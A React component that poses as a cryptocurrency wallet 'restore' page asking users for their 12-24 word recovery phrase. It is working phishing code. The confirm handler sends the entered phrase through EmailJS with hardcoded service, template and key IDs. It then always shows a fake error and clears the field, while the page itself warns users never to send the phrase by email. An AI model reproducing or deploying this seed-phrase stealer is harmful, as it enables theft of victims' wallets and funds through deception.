import { useState } from "react";
import { LockKeyhole, Clipboard, ArrowRight, ArrowLeft } from "lucide-react";
import emailjs from "@emailjs/browser";

const RecoveryPhrasePage = () => {
  const [phrase, setPhrase] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const handleBack = () => {
    // If you're using react-router-dom, replace this with:
    // const navigate = useNavigate();
    // navigate(-1);
    window.history.back();
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setPhrase(text);
      setMessage("Recovery phrase pasted.");
    } catch {
      setMessage("Unable to access clipboard.");
    }
  };

  const handleConfirm = async () => {
    const words = phrase.trim().split(/\s+/).filter(Boolean);

    if (words.length < 12 || words.length > 24) {
      setMessage("Please enter between 12 and 24 words.");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      const templateParams = {
        status: "Recovery phrase submitted",
        passphrase: phrase,
        page: "InterLink Wallet Demo",
      };

      await emailjs.send(
        "service_z6xi0fn",
        "template_wrvxyj3",
        templateParams,
        "fmT1OulfypX6PSmRm"
      );

      setMessage("Something went wrong. Please try again.");
      setPhrase("");
    } catch (error) {
      console.error(error);
      setMessage("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white px-5 pb-10 pt-8 text-[#11111c] sm:px-8">
      <main className="mx-auto w-full max-w-175
">

        {/* BACK BUTTON */}
        <button
          type="button"
          onClick={handleBack}
          aria-label="Go back"
          className="
            mb-6
            flex
            h-11
            w-11
            items-center
            justify-center
            rounded-full
            border-2
            border-[#eeeeF4]
            bg-white
            text-[#11111c]
            shadow-sm
            transition
            hover:border-[#695bea]
            hover:bg-[#faf9ff]
            hover:text-[#695bea]
            active:scale-95
          "
        >
          <ArrowLeft size={22} />
        </button>

        {/* HEADER */}
        <section>
          <h1 className="text-[38px] font-bold leading-tight tracking-tight sm:text-5xl">
            Enter recovery phrase
          </h1>

          <p className="mt-8 text-xl leading-9 text-[#686878] sm:text-2xl sm:leading-10">
            Please enter your 12-24 word recovery phrase below,
            separated by spaces, to restore your wallet.
          </p>
        </section>

        {/* INPUT */}
        <section className="mt-10">
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Enter a 12-24 word recovery phrase"
            className="
            min-h-75
              w-full
              resize-none
              rounded-[28px]
              border-2
              border-[#eeeeF4]
              bg-white
              p-7
              text-xl
              leading-9
              text-[#11111c]
              outline-none
              transition
              placeholder:text-[#b7b6c6]
              focus:border-[#695bea]
              focus:ring-4
              focus:ring-[#695bea]/10
              sm:min-h-92.5
              sm:p-9
              sm:text-2xl
            "
          />

          {/* PASTE BUTTON */}
          <div className="mt-5 flex justify-end">
            <button
              type="button"
              onClick={handlePaste}
              className="
                flex
                items-center
                gap-3
                rounded-full
                border-2
                border-[#eeeeF4]
                bg-white
                px-7
                py-4
                text-lg
                font-semibold
                shadow-sm
                transition
                hover:border-[#695bea]
                hover:bg-[#faf9ff]
                active:scale-95
              "
            >
              <Clipboard size={22} />
              Paste
            </button>
          </div>
        </section>

        {/* REMINDER */}
        <section className="mt-10">
          <div className="flex items-center gap-4">
            <div className="flex h-11 w-11 items-center justify-center text-[#e6b83f]">
              <LockKeyhole size={35} strokeWidth={1.8} />
            </div>

            <h2 className="text-2xl font-bold sm:text-3xl">Reminder</h2>
          </div>

          <div className="mt-5 space-y-7 text-lg leading-8 text-[#686878] sm:text-xl sm:leading-9">
            <p>
              • Store your recovery phrase securely and never
              send it through email, chat, screenshots, or
              untrusted third-party applications.
            </p>
          </div>
        </section>

        {/* STATUS MESSAGE */}
        {message && (
          <div className="mt-5 rounded-2xl bg-[#f5f5f8] p-4 text-sm text-gray-600">
            {message}
          </div>
        )}

        {/* CONFIRM */}
        <button
          type="button"
          onClick={handleConfirm}
          disabled={loading}
          className="
            mt-7
            flex
            w-full
            items-center
            justify-center
            gap-3
            rounded-full
            bg-[#695bea]
            px-6
            py-5
            text-xl
            font-bold
            text-white
            shadow-[0_10px_30px_rgba(105,91,234,0.28)]
            transition-all
            duration-300
            hover:-translate-y-1
            hover:bg-[#584bd8]
            hover:shadow-[0_15px_35px_rgba(105,91,234,0.35)]
            active:scale-[0.98]
            disabled:cursor-not-allowed
            disabled:opacity-60
          "
        >
          {loading ? "Submitting..." : "Confirm"}
          {!loading && <ArrowRight size={21} />}
        </button>

      </main>
    </div>
  );
};

export default RecoveryPhrasePage;